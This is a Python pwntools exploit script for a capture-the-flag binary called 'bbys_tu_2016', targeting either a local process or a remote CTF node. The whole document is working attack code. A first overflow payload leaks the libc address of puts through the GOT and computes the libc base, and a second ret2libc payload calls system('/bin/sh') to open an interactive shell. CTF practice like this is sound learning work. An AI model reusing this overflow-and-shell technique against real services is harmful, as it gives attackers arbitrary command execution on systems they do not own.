#coding:utf-8
import sys
import base64
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./bbys_tu_2016')
			#io=process(['./pwn'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./bbys_tu_2016')
			libc=ELF('/lib/i386-linux-gnu/libc-2.27.so')
		else :
			io=remote('node3.buuoj.cn',25800)
			elf=ELF('./bbys_tu_2016')
			libc=ELF('../../i386libc/libc.so.6')
		
		main_addr=0x08048470
		#gdb.attach(io,'b *0x80485f2')
		#sleep(0x10)
		pay='a'*0x14+p32(0xFFFFFFF0)+p32(0x804866C)+p32(elf.got['puts'])+p32(0x3f)+p32(0x3e)+p32(elf.got['fgets'])+p32(0x0804865B)+p32(elf.got['puts'])+'a'*0x28+p32(main_addr)
		
		io.sendline(pay)
		
		io.recvuntil('flow?\n')
		libc_base=u32(io.recv()[:4])-libc.sym['puts']
		libc.address=libc_base
		pay='a'*0x18+p32(libc.sym['system'])+p32(1)+p32(libc.search('/bin/sh\x00').next())
		io.sendline(pay)








		# success('libc_base:'+hex(libc_base))


		io.interactive()




	#except Exception as e:
		#raise e
	#else:
		#pass